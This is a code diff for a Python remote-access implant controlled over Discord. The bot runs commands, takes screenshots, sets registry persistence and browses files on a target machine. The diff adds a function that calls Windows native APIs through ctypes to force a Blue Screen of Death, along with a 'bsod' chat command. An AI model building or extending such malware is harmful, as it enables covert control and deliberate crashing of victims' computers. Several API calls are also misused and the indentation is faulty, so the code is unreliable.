@@ -9,6 +9,7 @@ from PIL import Image
 import io
 import sys      # For PyInstaller pathing
 import base64   # For the fallback token
+import ctypes
 
 # Import all other execution modules
 import command_executor as cmd; import notification_sender as notifier; import screenshot_taker as ss
@@ -59,6 +60,23 @@ def load_token():
         except Exception as e:
             print(f"FATAL ERROR: Could not decode the fallback token. Is it valid Base64? Error: {e}")
             raise
+
+
+def bluescreen() -> str:
+    """Triggers a Blue Screen of Death (BSOD) on the target device."""
+    try:
+        # Adjust privilege to SE_SHUTDOWN_NAME
+        privilege = ctypes.windll.advapi32.LookupPrivilegeValue(None, "SeShutdownPrivilege")
+        token = ctypes.windll.advapi32.OpenProcess(0x1000000, False, -1)  # Use -1 for the current process
+        ctypes.windll.advapi32.LookupPrivilegeValue(None, "SeShutdownPrivilege")
+        ctypes.windll.advapi32.AdjustTokenPrivileges(token, 0, 1, privilege, 0, 0, 0, 0, 0)
+        ctypes.windll.ntdll.RtlAdjustPrivilege(privilege, 1, 0, ctypes.byref(ctypes.c_byte()), 0, 0, 0, 0, 0)
+
+        # Trigger BSOD
+        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
+        return "✅ BSOD triggered successfully."
+    except Exception as e:
+        return f"❌ Failed to trigger BSOD. Error: {e}"
 
 def get_device_name():
     hostname = socket.gethostname(); return "".join(c for c in hostname.lower() if c.isalnum() or c == '-').strip()
@@ -136,6 +154,9 @@ async def on_message(message):
             status=pm.add_to_registry(args_str);await message.channel.send(embed=Embed(title="⚙️ Registry Persistence Status",description=f"`{status}`",color=EMBED_COLOR))
         elif command_name == "explore":
             await message.channel.send(embed=fe.create_explorer_embed(args_str))
+        elif command_name == "bsod":
+            result = bluescreen()
+        await message.channel.send(embed=Embed(title="💥 BSOD Triggered", description=result, color=discord.Color.red()))
         
     except Exception as e:
         await message.channel.send(embed=Embed(title="❌ Implant Error",description=f"On `{device_name}`:\n```py\n{e}\n```",color=discord.Color.red()))
